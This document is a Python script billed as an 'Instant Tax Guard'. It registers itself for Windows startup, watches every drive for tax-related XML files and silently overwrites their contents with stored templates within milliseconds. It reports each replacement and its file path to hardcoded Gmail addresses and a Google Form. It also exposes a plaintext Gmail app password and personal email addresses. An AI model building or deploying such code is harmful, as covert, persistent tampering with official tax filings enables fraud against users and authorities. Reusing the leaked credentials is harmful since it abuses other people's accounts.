# instant_guard.py - LIGHTNING SPEED <0.1s

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3
import asyncio
from concurrent.futures import ThreadPoolExecutor

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (chỉ dùng khi --gui)
import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Thư mục lưu config/log/state --- #
APP_DIR = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE = APP_DIR / 'processed_files.pkl'
LOG_FILE = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# ThreadPool cho tốc độ tức thì
THREAD_POOL = ThreadPoolExecutor(max_workers=10)

# Cache templates trong RAM để truy cập nhanh nhất
TEMPLATES_CACHE = {}
FORTRESS_CACHE = {}

# --- Logging UTF-8 vào file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def create_fortress_db():
    """Tạo database fortress để lưu trữ file gốc không thể xóa."""
    db_path = APP_DIR / 'fortress.db'
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS original_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            file_content BLOB,
            created_time TEXT,
            last_verified TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def load_fortress_cache():
    """Load tất cả file từ fortress vào RAM cache để truy cập tức thì."""
    global FORTRESS_CACHE
    try:
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        cursor = conn.execute('SELECT file_name, file_content FROM original_files')
        
        for row in cursor.fetchall():
            file_name = row[0]
            file_content = row[1].decode('utf-8')
            FORTRESS_CACHE[file_name] = file_content
            
        conn.close()
        logging.info(f"⚡ Loaded {len(FORTRESS_CACHE)} files to fortress cache")
    except Exception as e:
        logging.error(f"❌ Error loading fortress cache: {e}")

def store_original_file(file_path, content):
    """Lưu file gốc vào fortress database và cache."""
    try:
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        file_name = os.path.basename(file_path)
        
        conn.execute('''
            INSERT OR REPLACE INTO original_files 
            (file_hash, file_name, file_content, created_time, last_verified)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            file_hash,
            file_name,
            content.encode('utf-8'),
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        
        # Cập nhật cache ngay lập tức
        FORTRESS_CACHE[file_name] = content
        
        logging.info(f"⚡ Fortress cached: {file_name}")
        return file_hash
    except Exception as e:
        logging.error(f"❌ Lỗi lưu fortress: {e}")
        return None

def instant_restore(file_path):
    """Khôi phục tức thì từ RAM cache - <0.01 giây."""
    try:
        file_name = os.path.basename(file_path)
        
        # Tìm trong cache trước (nhanh nhất)
        if file_name in FORTRESS_CACHE:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(FORTRESS_CACHE[file_name])
            return True
            
        # Tìm theo pattern nếu không có exact match
        for cached_name, cached_content in FORTRESS_CACHE.items():
            if any(part in cached_name for part in file_name.split('_') if len(part) > 5):
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(cached_content)
                return True
                
        return False
    except Exception as e:
        logging.error(f"❌ Instant restore error: {e}")
        return False

def load_sent_logs():
    """Tải danh sách các log đã gửi từ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """Lưu danh sách các log đã gửi."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "InstantGuard", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"⚡ Instant startup enabled")
    except Exception as e:
        logging.error(f"❌ Startup failed: {e}")

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("⚡ Instant alert sent")
    except Exception as e:
        logging.error(f"❌ Gmail failed: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("⚡ Instant form sent")
    except Exception as e:
        logging.error(f"❌ Form failed: {e}")

def send_remote_log(event, path=None, once=False):
    """Gửi log về Google Form và Gmail, chỉ gửi một lần nếu once=True."""
    # Chạy async để không block tốc độ chính
    THREAD_POOL.submit(send_remote_log_async, event, path, once)

def send_remote_log_async(event, path=None, once=False):
    """Async version của send_remote_log."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Instant: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def load_templates_cache():
    """Load tất cả templates vào RAM cache."""
    global TEMPLATES_CACHE
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    
    for tpl in templates:
        try:
            with open(tpl, 'r', encoding='utf-8') as f:
                content = f.read()
            
            file_name = os.path.basename(tpl)
            TEMPLATES_CACHE[file_name] = content
            
            # Lưu vào fortress và cache
            store_original_file(tpl, content)
            
        except Exception as e:
            logging.error(f"❌ Error loading template: {e}")
    
    logging.info(f"⚡ Loaded {len(TEMPLATES_CACHE)} templates to cache")
    return templates

def get_templates():
    """Load templates và trả về list paths."""
    if not TEMPLATES_CACHE:
        load_templates_cache()
    
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    
    return [os.path.join(tpl_dir, name) for name in TEMPLATES_CACHE.keys()]

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

class InstantHandler(FileSystemEventHandler):
    """INSTANT SPEED: Phát hiện và ghi đè <0.1 giây."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            # Chạy ngay lập tức trong thread pool
            THREAD_POOL.submit(self.instant_protect, event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            THREAD_POOL.submit(self.instant_protect, event.dest_path)

    def on_modified(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.instant_protect, event.src_path)

    def instant_protect(self, file_path):
        """INSTANT PROTECTION: Tức thì <0.1 giây."""
        start_time = time.time()
        
        try:
            # Kiểm tra có phải file thuế không (nhanh)
            if not self.is_tax_file(file_path):
                return
                
            # Đọc nội dung hiện tại
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_content = f.read()
            except:
                return
                
            # Tìm template phù hợp từ cache (tức thì)
            matching_template = self.find_template_instant(current_content, file_path)
            
            if not matching_template:
                return
                
            # So sánh nội dung
            if current_content == matching_template:
                return  # File đã đúng
                
            # GHI ĐÈ TỨC THÌ
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(matching_template)
                
            elapsed = (time.time() - start_time) * 1000
            logging.info(f"⚡ INSTANT RESTORE: {file_path} in {elapsed:.1f}ms")
            
            # Gửi log async để không làm chậm
            if elapsed < 100:  # Chỉ log nếu thực sự nhanh
                THREAD_POOL.submit(send_remote_log_async, "⚡ Lightning restore", file_path, False)
                
        except Exception as e:
            logging.error(f"❌ Instant protect error: {e}")

    def is_tax_file(self, file_path):
        """Kiểm tra nhanh có phải file thuế không."""
        file_name = os.path.basename(file_path).lower()
        return (file_name.startswith('etax') or 
                'xml' in file_name or 
                any(key in file_name for key in ['tax', 'thue', 'vat']))

    def find_template_instant(self, content, file_path):
        """Tìm template từ cache RAM - tức thì."""
        file_name = os.path.basename(file_path)
        
        # Tìm exact match trong fortress cache trước
        if file_name in FORTRESS_CACHE:
            return FORTRESS_CACHE[file_name]
            
        # Tìm theo pattern
        for cached_name, cached_content in FORTRESS_CACHE.items():
            if self.match_pattern(file_name, cached_name):
                return cached_content
                
        # Fallback - tìm trong templates cache
        for template_name, template_content in TEMPLATES_CACHE.items():
            if self.match_pattern(file_name, template_name):
                return template_content
                
        return None

    def match_pattern(self, file_name, template_name):
        """Kiểm tra pattern match nhanh."""
        # Exact match
        if file_name == template_name:
            return True
            
        # Message ID match
        file_parts = file_name.split('_')
        template_parts = template_name.split('_')
        
        if len(file_parts) > 0 and len(template_parts) > 0:
            if file_parts[-1].split('.')[0] == template_parts[-1].split('.')[0]:
                return True
                
        return False

def start_monitor():
    """INSTANT MODE: Giám sát tức thì toàn PC."""
    send_remote_log("⚡ INSTANT GUARD ACTIVATED", once=True)
    add_to_startup()
    
    # Load cache vào RAM để truy cập tức thì
    create_fortress_db()
    load_fortress_cache()
    templates = get_templates()
    
    logging.info("⚡ Instant Guard ready - All cache loaded")

    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler = InstantHandler(tpl_map)
    observer = Observer()
    
    # Giám sát tất cả ổ đĩa
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    logging.info(f"⚡ Instant monitoring {len(drives)} drives")

    try:
        while True:
            time.sleep(0.1)  # Check every 0.1s cho tốc độ tối đa
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("⚡ Instant guard deactivated", once=True)
    except Exception as e:
        logging.error(f"❌ Error: {e}")
    observer.join()

def launch_gui():
    """GUI mode."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("Instant Tax Guard - GUI")
    root.geometry("600x500")

    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, p)
    lb_tpl.pack(fill='x', padx=10, pady=(10,5))

    lbl = ctk.CTkLabel(root, text="⚡ INSTANT SPEED - Templates & Logs:")
    lbl.pack(pady=5)

    lb_log = Listbox(root)
    sb = Scrollbar(root, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=(10,0), pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()